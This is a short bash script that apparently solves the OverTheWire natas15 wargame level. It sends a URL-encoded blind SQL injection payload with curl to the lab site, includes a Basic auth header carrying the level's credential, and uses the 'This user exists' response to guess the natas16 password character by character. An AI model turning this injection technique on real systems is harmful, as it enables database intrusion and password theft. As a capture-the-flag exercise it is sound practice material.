#!/bin/bash

SECONDS=0

export QUERY_PREFFIX="username=%22+and+1%3D2+UNION+SELECT+null%2Cnull+FROM+users+WHERE+username%3D%22natas16%22+AND+password+LIKE+%27%25"
export QUERY_SUFFIX='%25%27+%23'
PASSWORD=""
ALPHABET=""

function perform_request(){
    curl -s 'http://natas15.natas.labs.overthewire.org/index.php' \
      -H 'Cache-Control: max-age=0' \
      -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \
      --data-raw "$QUERY_PREFFIX$1$QUERY_SUFFIX" \
      --compressed \
      --insecure \
      --max-time 5
}

function enum_alphabet(){
    perform_request $1 | grep "This user exists" > /dev/null && echo "show $1"
}

function enum_alphabet_parallel(){
    for letter in {a..c}; do echo "$letter"; done | parallel --max-args=1 enum_alphabet
}


export -f {perform_request,enum_alphabet}

enum_alphabet_parallel



echo "$SECONDS segs"
